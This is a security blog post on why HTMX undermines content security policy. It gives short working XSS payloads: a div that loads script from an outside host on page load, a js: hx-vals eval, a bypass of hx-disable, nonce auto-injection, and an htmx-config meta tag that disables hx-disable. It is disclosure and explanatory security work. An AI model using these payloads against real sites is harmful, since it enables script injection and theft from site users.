---
layout: post
title: "HTMX does not play well with content security policy"
thumbnail: blue-gate-480.jpg
date: 2024-06-26
---

HTMX is a JavaScript framework that makes it possible to replace DOM elements with dynamic data from AJAX requests, specified by HTML attributes. Because dynamic behavior is added to the page using normal HTML tags with custom attributes, it is difficult to provide additional security against cross-site scripting (XSS) attacks.

<!-- Photo source: https://pixabay.com/photos/blue-gate-english-countryside-1725791/ -->

## Introduction

Normally, a content security policy (CSP) can be used to limit which JavaScript is executed. It is difficult to configure a CSP where HTMX keeps working and is also protected against cross-site scripting.

## Loading malicious fragments

An obvious HTMX injection method is to perform a request to a malicious host. HTMX retrieves a HTML fragment, possibly containing JavaScript, and places it on the page. By triggering a request to domain other than the web application's, this can be used to load malicious script.

For example, the following tag loads and executes JavaScript that shows an alert:

```
<div hx-get="https://test.sjoerdlangkemper.nl/cors.php" hx-trigger="load"></div>
```

<a href="https://demo.sjoerdlangkemper.nl/htmx/connect.php?name=hacker">Try it</a>

## Unsafe eval

HTMX dynamically creates and executes code. There are several HTMX [features](https://htmx.org/docs/#configuration-options) that do this:

- [trigger filters](https://htmx.org/docs/#trigger-filters)
- [*hx-on* attributes](https://htmx.org/docs/#hx-on)
- *hx-vals* or *hx-headers* with the `js:` or `javascript:` prefix

For these to work, you have to allow evaluating dynamic code, using the CSP option `unsafe-eval`. However, allowing `unsafe-eval` immediately makes it possible to inject JavaScript using HTMX functionality.

For example, injecting the following tag shows an alert popup:

```
<div hx-vals='js:"a":alert(`XSS`)' hx-get="/" hx-trigger='load'>foo</div>
```

<a href="https://demo.sjoerdlangkemper.nl/htmx/eval.php?name=hacker">Try it</a>

## Disabling HTMX with *hx-disable*

It's possible to disable HTMX functionality in part of the page with the [*hx-disable* attribute](https://htmx.org/docs/#hx-disable). The docs claim this can bring additional security:

```
<div hx-disable>
    <%= raw(user_content) %>
</div>
```

> And htmx will not process any htmx-related attributes or features found in that content. This attribute cannot be disabled by injecting further content: if an hx-disable attribute is found anywhere in the parent hierarchy of an element, it will not be processed by htmx.

Of course, this is trivial to bypass: just close the div tag with `</div>` and insert your payload outside of the element with the *hx-disable* attribute.

<a href="https://demo.sjoerdlangkemper.nl/htmx/disable.php?name=hacker">Try it</a>

## Nonces for inline scripts

Using a nonce in the CSP is the most secure way to prevent script injection. The application generates a random nonce and adds that to all scripts that are part of the application. Scripts injected by the attacker don't have the correct nonce and are not executed.

HTMX has functionality that automatically adds the correct nonce to inline scripts it retrieves. This is convenient, but totally breaks the security model of CSP with nonces. By adding the correct nonce to any script it finds, HTMX totally compromises the security offered by nonces.

Automatically adding nonces is done through the [parameter](https://htmx.org/docs/#config) `htmx.config.inlineScriptNonce`. 

<a href="https://demo.sjoerdlangkemper.nl/htmx/nonce.php?name=hacker">Try it</a>

## Configuration meta tag

HTMX has several configuration options, which can be configured using a `<meta>` tag. In an XSS attack, this makes it possible to modify HTMX's configuration by injecting the correct `<meta>` tag.

For example, above we mentioned that the `hx-disable` attribute disabled HTMX processing. However, it is possible to rename that attribute in the configuration. By setting it from `hx-disable` to something else, the `hx-disable` functionality can be disabled. This can be achieved by injecting the following tag:

```
<meta name="htmx-config" content='{"disableSelector":"outerHTML"}'>
```

This even works within a tag with *hx-disable*, but only if there is no similar meta tag above it.